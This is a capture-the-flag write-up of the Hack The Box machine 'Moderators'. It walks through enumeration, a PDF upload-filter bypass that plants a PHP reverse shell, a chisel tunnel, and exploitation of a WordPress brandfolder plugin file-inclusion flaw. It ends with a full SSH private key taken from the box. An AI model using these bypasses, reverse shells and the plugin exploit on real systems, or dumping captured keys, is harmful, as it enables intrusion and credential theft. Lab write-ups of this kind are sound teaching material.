```console
└─$ nmap -A -p- -T4 -Pn 10.129.99.138     
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-07 11:29 CDT
Nmap scan report for 10.129.99.138
Host is up (0.067s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 39:03:16:06:11:30:a0:b0:c2:91:79:88:d3:93:1b:3e (RSA)
|   256 51:94:5c:59:3b:bd:bc:b6:26:7a:ef:83:7f:4c:ca:7d (ECDSA)
|_  256 a5:6d:03:fa:6c:f5:b9:4a:a2:a1:b6:bd:bc:60:42:31 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Moderators
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 674.55 seconds
zsh: segmentation fault  nmap -A -p- -T4 -Pn 10.129.99.138
```

```console
└─$ feroxbuster -u http://10.129.99.138 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,git -q
200      GET      295l      683w        0c http://10.129.99.138/
403      GET        9l       28w      278c http://10.129.99.138/.php
403      GET        9l       28w      278c http://10.129.99.138/.html
301      GET        9l       28w      313c http://10.129.99.138/logs => http://10.129.99.138/logs/
200      GET      283l      990w        0c http://10.129.99.138/blog.php
301      GET        9l       28w      315c http://10.129.99.138/images => http://10.129.99.138/images/
200      GET      318l      612w        0c http://10.129.99.138/about.php
301      GET        9l       28w      312c http://10.129.99.138/css => http://10.129.99.138/css/
200      GET      267l      555w        0c http://10.129.99.138/contact.php
200      GET      295l      683w        0c http://10.129.99.138/index.php
302      GET      226l      417w     7888c http://10.129.99.138/reports.php => index.php
200      GET      249l      596w        0c http://10.129.99.138/service.php
301      GET        9l       28w      317c http://10.129.99.138/logs/css => http://10.129.99.138/logs/css/
301      GET        9l       28w      320c http://10.129.99.138/images/blog => http://10.129.99.138/images/blog/
301      GET        9l       28w      321c http://10.129.99.138/logs/uploads => http://10.129.99.138/logs/uploads/
200      GET        0l        0w        0c http://10.129.99.138/logs/index.html
200      GET        0l        0w        0c http://10.129.99.138/images/index.html
200      GET        0l        0w        0c http://10.129.99.138/css/index.html
403      GET        9l       28w      278c http://10.129.99.138/logs/.php
403      GET        9l       28w      278c http://10.129.99.138/logs/.html
200      GET        0l        0w        0c http://10.129.99.138/logs/uploads/index.html
200      GET        0l        0w        0c http://10.129.99.138/images/blog/index.html
200      GET        0l        0w        0c http://10.129.99.138/logs/css/index.html
403      GET        9l       28w      278c http://10.129.99.138/images/.php
403      GET        9l       28w      278c http://10.129.99.138/images/.html
403      GET        9l       28w      278c http://10.129.99.138/server-status
302      GET        0l        0w        0c http://10.129.99.138/send_mail.php => /contact.php?msg=Email sent
Scanning: http://10.129.99.138
Scanning: http://10.129.99.138/
Scanning: http://10.129.99.138/logs
Scanning: http://10.129.99.138/images
Scanning: http://10.129.99.138/css
Scanning: http://10.129.99.138/logs/css
Scanning: http://10.129.99.138/images/blog
Scanning: http://10.129.99.138/logs/uploads
```

```console
└─$ ffuf -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt  -u http://10.129.99.138/reports.php?report=FUZZ -v -fs 0 -fw 3091 -fc 302 -c -s
2589
3478
4221
7612
8121
9798
```

```
 Report #9798

# Disclosure Information [+] Domain : bethebest101.uk.htb
[+] Vulnerability : Sensitive Information Disclosure
[+] Impact : 3.5/4.0
[+] Disclosed by : Karlos Young
[+] Disclosed on : 11/19/2021
[+] Posted on :
[+] Approved :
[+] Patched : NO
[+] LOGS : logs/e21cece511f43a5cb18d4932429915ed/
```

Running feroxbuster reveals that the there is a logs.pdf in the directory.

```
└─$ feroxbuster -u http://10.129.99.138/logs/e21cece511f43a5cb18d4932429915ed -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,git,pdf -q
301      GET        9l       28w      346c http://10.129.99.138/logs/e21cece511f43a5cb18d4932429915ed => http://10.129.99.138/logs/e21cece511f43a5cb18d4932429915ed/
403      GET        9l       28w      278c http://10.129.99.138/logs/.php
403      GET        9l       28w      278c http://10.129.99.138/logs/.html
200      GET      219l      806w    10059c http://10.129.99.138/logs/e21cece511f43a5cb18d4932429915ed/logs.pdf
200      GET        0l        0w        0c http://10.129.99.138/logs/e21cece511f43a5cb18d4932429915ed/index.html
Scanning: http://10.129.99.138/logs/e21cece511f43a5cb18d4932429915ed
```

In fact each of these report numbers are actually the the directory hashes. If you run feroxbuster on all of these it will show that each of them have logs.pdf files.

```
e21cece511f43a5cb18d4932429915ed=9798
743c41a921516b04afde48bb48e28ce6=2589
b071cfa81605a94ad80cfa2bbc747448=3478
b071cfa81605a94ad80cfa2bbc747448=4221
ce5d75028d92047a9ec617acb9c34ce6=7612
afecc60f82be41c1b52f6705ec69e0f1=8121
```

So by navigating to this pdf file it will give us some output and reveal a webpage that allows us to upload pdf files.

http://moderators.htb/logs/743c41a921516b04afde48bb48e28ce6/logs.pdf

```
Logs
[01/30/2021] Log file created for report #2589.
[01/30/2021] Report submitted by Sharaf Ahamed.
[02/03/2021] Report accepted.
[02/03/2021] LOG file uploaded from /logs/report_log_upload.php
[02/04/2021] Reported to the site administrators.
[02/05/2021] Posting approval sent to the owners.
[02/07/2021] Approval pending......
```


![image](https://user-images.githubusercontent.com/105310322/194651486-d61e8bfb-b8b7-4b94-a34a-09c5a2cd03c3.png)

However it only allows us to upload pdf files and we cannot get a reverse shell through a pdf.

So Wget one of the logs.pdf files and upload it from the page.

Then capture in burpsuite and edit out the pdf content with our own payload.

Note: Be sure to change the pdf file type to something like shell.pdf.php and to leave the %PDF-1.5 to bypass the filter.
Note2: Also be sure to rename the file if you fail since the files do not get overwritten or deleted.



![image](https://user-images.githubusercontent.com/105310322/194648359-03a0333b-00f3-467f-9306-0353c31b93fe.png)



<?php
phpinfo();

![image](https://user-images.githubusercontent.com/105310322/194648168-1e62ad99-1e4f-4fe7-993b-7bdf3a2a6a34.png)



Using pentestmonkeys reverse php shell I was able to get in.

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

```console
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.16.19] from (UNKNOWN) [10.129.99.138] 38316
Linux moderators 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 20:43:51 up  4:16,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```

```console
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@moderators:/tmp$ 
```

lexi         877  0.0  0.8 228360 31968 ?        S    16:27   0:00      _ /usr/bin/php -S 127.0.0.1:8080 -t /opt/site.new/

╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                 
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                                                                             
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -  



www-data@moderators:/tmp$ ls -la /opt/site.new
ls -la /opt/site.new
total 228
drwxr-xr-x  5 lexi moderators  4096 Jul 14 10:50 .
drwxr-xr-x  3 root root        4096 Jul 14 10:50 ..
-rw-r--r--  1 lexi moderators   405 Sep 11  2021 index.php
-rw-r--r--  1 lexi moderators 19915 Jan 29  2022 license.txt
-rw-r--r--  1 lexi moderators  7437 Jan 29  2022 readme.html
-rw-r--r--  1 lexi moderators  7165 Sep 11  2021 wp-activate.php
drwxr-xr-x  9 lexi moderators  4096 Jul 14 10:50 wp-admin
-rw-r--r--  1 lexi moderators   351 Sep 11  2021 wp-blog-header.php
-rw-r--r--  1 lexi moderators  2338 Jan 29  2022 wp-comments-post.php
-rw-r--r--  1 lexi moderators  3001 Jan 29  2022 wp-config-sample.php
-rw-r--r--  1 lexi moderators  3004 Sep 11  2021 wp-config-sample.php.bak
-rwxr-----  1 lexi moderators  3118 Sep 11  2021 wp-config.php
drwxr-xr-x  6 lexi moderators  4096 Jul 14 10:50 wp-content
-rw-r--r--  1 lexi moderators  3939 Sep 11  2021 wp-cron.php
drwxr-xr-x 26 lexi moderators 12288 Jul 14 10:50 wp-includes
-rw-r--r--  1 lexi moderators  2496 Sep 11  2021 wp-links-opml.php
-rw-r--r--  1 lexi moderators  3900 Sep 11  2021 wp-load.php
-rw-r--r--  1 lexi moderators 47916 Jan 29  2022 wp-login.php
-rw-r--r--  1 lexi moderators  8582 Jan 29  2022 wp-mail.php
-rw-r--r--  1 lexi moderators 23025 Jan 29  2022 wp-settings.php
-rw-r--r--  1 lexi moderators 31959 Jan 29  2022 wp-signup.php
-rw-r--r--  1 lexi moderators  4747 Sep 11  2021 wp-trackback.php
-rw-r--r--  1 lexi moderators  3236 Sep 11  2021 xmlrpc.php


```console
└─$ chisel server --reverse --port 1235
2022/10/07 16:35:37 server: Reverse tunnelling enabled
2022/10/07 16:35:37 server: Fingerprint CLzmvEC7zbiS5jQUtTW0/FEXtHqVQ0MPDH+tiHS3PJw=
2022/10/07 16:35:37 server: Listening on http://0.0.0.0:1235
2022/10/07 16:35:50 server: session#1: Client version (1.7.7) differs from server version (0.0.0-src)
2022/10/07 16:36:11 server: session#2: Client version (1.7.7) differs from server version (0.0.0-src)
2022/10/07 16:36:11 server: session#2: tun: proxy#R:8080=>localhost:8080: Listening
```

```console
www-data@moderators:/tmp$ ./chisel2 client 10.10.16.19:1235 R:8080:localhost:8080
<isel2 client 10.10.16.19:1235 R:8080:localhost:8080
2022/10/07 21:36:11 client: Connecting to ws://10.10.16.19:1235
2022/10/07 21:36:11 client: Connected (Latency 29.036943ms)
```



https://www.exploit-db.com/exploits/39591


www-data@moderators:/tmp$ mkdir /var/www/html/logs/uploads/shell


```
www-data@moderators: mkdir -p /var/www/html/logs/uploads/wp/wp-admin/includes
```
```
www-data@moderators: echo '<?php ?>' > wp-admin/includes/media.php
echo '<?php ?>' > wp-admin/includes/file.php
echo '<?php ?>' > wp-admin/includes/image.php
echo '<?php ?>' > wp-admin/includes/post.php
```

http://127.0.0.1:8080/wp-content/plugins/brandfolder/callback.php?wp_abspath=/var/www/html/logs/uploads/wp/

```console
└─$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.10.16.19] from (UNKNOWN) [10.129.99.138] 33914
bash: cannot set terminal process group (859): Inappropriate ioctl for device
bash: no job control in this shell
lexi@moderators:/opt/site.new/wp-content/plugins/brandfolder$ cd 
cd 
lexi@moderators:~$ ls
ls
user.txt
lexi@moderators:~$ cat user.txt
cat user.txt
9f60****************************
```

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAmHVovmMN+t0u52ea6B357LfXjhIuTG4qkX6eY4iCw7EBGKwaEryn
ECxvN0TbZia5MhfHhJDL88bk2CososBm6i0phnvPo5facWeOzP3vdIiJYdP0XrZ5mNMLbM
ONvoGU8p8LKhlfzHIBqhPxB4N7Dgmcmg2DJ/QRXYrblAj8Bo1owGebWUBlB/tMcO3Yqvaa
QCuzVluSShMrGKJVjL0n2Uvqf/Dw4ouQK3TwXdzrluhCo9icb+2QdA7KxmInb71+OT6rWV
dQ5ymZTot+/qALnzlDkeUlT/RWtqJxJc6MlWy5/neegZRRd3YNhln/1GyL5aN/0O1gBwf3
vY87IYFXK/W0a9Tj5mZ0RNDEOU+wSicM9nS3jabM1Unocq7jw36UPHQhniso6Q7ObvMnWv
cxbVFo9M2axqTTnr/gFkLzU0sj8ms4nxoRagCvc8oOUpMXoauEwEwdpbq3FfT8aKGYKl64
vO+aJxiTPkPpgI6L+pWCYfLXIXwcbVo2xXp3euHLAAAFiI1Y9VaNWPVWAAAAB3NzaC1yc2
EAAAGBAJh1aL5jDfrdLudnmugd+ey3144SLkxuKpF+nmOIgsOxARisGhK8pxAsbzdE22Ym
uTIXx4SQy/PG5NgqLKLAZuotKYZ7z6OX2nFnjsz973SIiWHT9F62eZjTC2zDjb6BlPKfCy
oZX8xyAaoT8QeDew4JnJoNgyf0EV2K25QI/AaNaMBnm1lAZQf7THDt2Kr2mkArs1ZbkkoT
KxiiVYy9J9lL6n/w8OKLkCt08F3c65boQqPYnG/tkHQOysZiJ2+9fjk+q1lXUOcpmU6Lfv
6gC585Q5HlJU/0VraicSXOjJVsuf53noGUUXd2DYZZ/9Rsi+Wjf9DtYAcH972POyGBVyv1
tGvU4+ZmdETQxDlPsEonDPZ0t42mzNVJ6HKu48N+lDx0IZ4rKOkOzm7zJ1r3MW1RaPTNms
ak056/4BZC81NLI/JrOJ8aEWoAr3PKDlKTF6GrhMBMHaW6txX0/GihmCpeuLzvmicYkz5D
6YCOi/qVgmHy1yF8HG1aNsV6d3rhywAAAAMBAAEAAAGAUZ2o8SL9/OojjeW8274QaVURpB
C/kFL5nuH10LrnpfM/7wFTA+zSUqo275OBEHJyegqY2LLbPCmhoMcTFh2B+qMqs7/cLGvC
mSsjG0JlyjC9uw1IqNtuxQ1V9GfLncyo/CmARI1I552wnmgGhEsyuRUULLRHHkBee4E2g0
07/hX9meLdGy6J53f0OBBcCUny0Z+TZguniNgyHgHpYmpwxrcJVmyZx+2GxHzZoKX/yM2V
vzjapmC7ECZLD2DEU+FQua6YHGw2KOs5tiX7BLQLr2R4cqz0akMZZJ0utIEWgDi5dX/EYy
y8HfqtCPWmplcrhtw/DTRVLLCtiL0zzmYMiqvgh6OQZmFcLd0B0jbvBq3fq2l+UAMcUrWp
o1D3Rv/KRIVRog9+7e6r8aRVPf/vIXy+jJlaWcG5Tq7a7wWwGQcqVW3aGnZivvc2aYMWVu
x4G5F1sD9bamasGARP/j0UNTeBNai+Lg1WDIHOzxq8bQhI0Xvdp2reFFzLGn8ePh0hAAAA
wEaFdCpqhzFIqnwgDxrrQJ4QlvysZbMCVgxApzM5SLtAt6jQLBCLrOwe/DYpdFOjIK888U
0IRMzUtQjoP+RNU1PJZtB+neDkw6Kl1Muf4DCnTXr9mwyVlMQHmW1asWiEDr66YqLiKSF6
CZHYRpFM4qUA+w3ABi8OJ+wzs+KDVk4Aw+v+AotbL9JStLBksR5P08sxAivWT/KbXMifJn
LrcrmS/t+QdOG2Vf/7ebYiyBbg1TD4BUAsjKZs8kByr6PoKQAAAMEAyQ1JW3/xrUZyhlWn
NnYVC0xcmSAkl90jHyW5AhR+5neuIu548xnk8a3PSO6j3w7kEmJTiOorwzAdM/u9CqWiaU
h7E4bnCEoakAlftaJsXWUtf1G7ZXcK587Ccxv330XHToH4HqF408oC/mM40/JNJ9Rqa9Io
9azk0fEjIQmjF0GqdNTBfSNqoqZX7HTV34FO+8mj+7fFvrFOnHKsa2FiwADUgEmkw2jJ63
egq/DaGJECdxk9CNDElLVQxBs3X4i/AAAAwQDCIEQcdMnPI9cP5WUOmWWNH6jlpEpsF0qm
0iAt4qjy/3uoN0NdQrX+8laOMIzRVe/Br4Py4NVmRTsMfU5t/1Jz/DXJoy9CcXD5VKkUnU
p668wxSJC8y/5cYKTeE8rwhDXxP0I5ZJztCYf8bL2BWSWF/h4iiUW4mMKyAzvg/iDfjGmb
xA8bieu1cmlE5GJgbXeuxeDfRyzWtLfYCwZU5E9RHz0D+1x1M9P+EaNVQu0p3vsS8rWJly
J/dOO74/zovfUAAAAPbGV4aUBtb2RlcmF0b3JzAQIDBA==
-----END OPENSSH PRIVATE KEY-----
```
